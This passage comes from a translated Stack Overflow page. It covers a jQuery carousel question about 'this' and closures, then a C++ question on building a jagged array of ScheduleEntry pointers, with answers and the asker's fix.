                        $.proxy(function(){
                            this.run();
                        }, this)
                   ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:46:33.837

```
this.setAnimation=function(state){
        var obj=this;
        if(state)obj.animationID=setInterval(function() { 
            obj.run();
            },obj.config.speed);
        else {
            clearInterval(obj.animationID);
            }
        }; 
```

你在寻找这样的东西吗？

```
setAnimation(true)//start Animation 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T23:00:59.213

通常，在 jQuery 插件中，使用“this”会造成混淆。原因正是您所指出的 - “this”完全依赖于上下文，并且因为 jQuery 通常依赖于链接 - 关键字的值经常变化。

我的建议是——而不是使用“this”——利用闭包的力量。一个例子：

```
// Instead of...
carouselClass = function (el, opts) {
    this.id = $(el).attr("id");        
    this.i = 0;                     
    this.config = opts;
    this.wraper;
    this.count = 0;
    this.flag = true;
    this.init = function() {
    }
};

// Try...
var Carousel = function (el, options) {
    var $el = (el instanceOf jQuery) ? el : $(el);

    var defaults = {
        id: $(el).attr('id'),
        currentIndex: 0,
        count: 0,
        flag: true,
        config: {
            // Defaults go here.
        }
    };
    var settings = $.extend(true, {}, defaults, options);

    var fx = {
        init: function (newOptions) {
            settings = $.extend(true, {}, defaults, settings, newOptions);
            // Now you can do other init stuff based on settings.Option,
            // rather than caring what "this" is equal to.
        },
        run: function () {
            // Note that you can use settings.Option here, too - and again,
            // you don't care what "this" is, because settings is within
            // an outer closure.
        },
        prepare: function () {
            // Do your prepare stuff here.
        }
    };
}; 
```

使用这种意识形态 - 你的功能可能会变成类似于这样的东西：

```
run = function() {
    if (settings.config.direction == "top") {
        var height = settings.wrapper.height();
        var image_height = height / settings.count;

        for(j = 0; j < (settings.count - 1); j++) {
            settings.wrapper.animate(
                { top: '-=' + image_height },
                settings.config.speed
            )
        }

        settings.wrapper.animate({ top: '0px' }, settings.config.speed);
        fx.prepare();
    }
} 
```

我还应该注意 - 此代码不打算用作您的直接、有效的替代品 - 只是一个示例，说明如何通过构造代码以利用闭包和基于闭包的优势来避免“这个”问题设置机制。

# c++ - 锯齿状的类数组

> ID：11091996
> 
> 赞同：2
> 
> 时间：2012-06-18T22:28:04.093
> 
> 标签：c++, jagged-arrays

在我的新工作中，我意识到迄今为止我实际使用的 C++ 技能有多么少。我现在正在通过一些自我强加的 OOP 练习而苦苦挣扎，并且被困在一系列参差不齐的课程中。

这是代码：

```
#define CAT_ONE_COUNT    6
#define CAT_TWO_COUNT    7
#define CAT_THREE_COUNT 20
#define CAT_FOUR_COUNT   5
#define CAT_FIVE_COUNT   4
#define CAT_SIX_COUNT   20

enum {CAT_ONE, CAT_TWO, CAT_THREE, CAT_FOUR, CAT_FIVE};

class EntryList
{
    private:
        ScheduleEntry* catOne[CAT_ONE_COUNT];
        ScheduleEntry* catTwo[CAT_TWO_COUNT];
        ScheduleEntry* catThree[CAT_THREE_COUNT];
        ScheduleEntry* catFour[CAT_FOUR_COUNT];
        ScheduleEntry* catFive[CAT_FIVE_COUNT];
        ScheduleEntry* catSix[CAT_SIX_COUNT];

        ScheduleEntry** entries[];

    public:
        EntryList();
        ~EntryList();

        std::string getEntry(int cat, int entry);
};

EntryList::EntryList()
{
    catOne[0] = new ScheduleEntry("Pressups");
    catOne[1] = new ScheduleEntry("Situps");
    catOne[2] = new ScheduleEntry("Squats");
    catOne[3] = new ScheduleEntry("Bench Work");
    catOne[4] = new ScheduleEntry("Partner Versions");
    catOne[5] = new ScheduleEntry("Running + Numbers");

    entries[CAT_ONE] = &catOne;
} 
```

显然，ScheduleEntry （并且成员函数）在其他地方定义，并且我在尝试编译时遇到的错误如下：

```
gfi@testbox:~/test$ g++ -o test -std=c++0x main.cpp
In file included from main.cpp:6:
EntryList.h: In constructor ‘EntryList::EntryList()’:
EntryList.h:40: error: cannot convert ‘ScheduleEntry* (*)[6]’ to ‘ScheduleEntry**’ in assignment 
```

在阅读了我能找到的锯齿状数组之后，这是我认为实现它的最简单、最易读的方式。首先要做的事——是吗？有没有更简单的方法？

接下来（当然）编译器错误。我怎么把打字搞砸了？

提前致谢。=)

**编辑：**

找到了快乐的媒介。

```
#define CAT_ONE_COUNT    6
#define CAT_TWO_COUNT    7
#define CAT_THREE_COUNT 20
#define CAT_FOUR_COUNT   5
#define CAT_FIVE_COUNT   4
#define CAT_SIX_COUNT   20

enum {CAT_ONE, CAT_TWO, CAT_THREE, CAT_FOUR, CAT_FIVE};

class EntryList
{
    private:
        ScheduleEntry** entries[6];

public:
    EntryList();
    ~EntryList();

    std::string getEntry(int cat, int entry);
};

EntryList::EntryList()
{
    entries[CAT_ONE] = new ScheduleEntry*[CAT_ONE_COUNT];
    entries[CAT_ONE][0] = new ScheduleEntry("Pushup");
    entries[CAT_ONE][1] = new ScheduleEntry("Situps");
    entries[CAT_ONE][2] = new ScheduleEntry("Squats");
    entries[CAT_ONE][3] = new ScheduleEntry("Bench Work");
    entries[CAT_ONE][4] = new ScheduleEntry("Partner Versions");
    entries[CAT_ONE][5] = new ScheduleEntry("Running + Numbers");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:40:01.293

语法错误是：

```
entries[CAT_ONE] = &catOne; // Arrays are secretly pointers so this won't work 
```

用。。。来代替：

```
entries[CAT_ONE] = catOne; // catOne is a ScheduleEntry* [], which is a ScheduleEntry** 
```

你可能会逃脱类似的事情：

```
const int width = 6;
int height[width] = { 6, 7, 20, 5, 4, 20 };

ScheduleEntry*** entries = new (ScheduleEntry**)[width];
for (int i = 0; i < width; ++i) entries[i] = new (ScheduleEntry*)[height[i]];

entries[0][0] = new ScheduleEntry("Pressups");
entries[0][1] = new ScheduleEntry("Situps");
entries[0][2] = new ScheduleEntry("Squats");
entries[0][3] = new ScheduleEntry("Bench Work");
entries[0][4] = new ScheduleEntry("Partner Versions");
entries[0][5] = new ScheduleEntry("Running + Numbers");
// etc etc 
```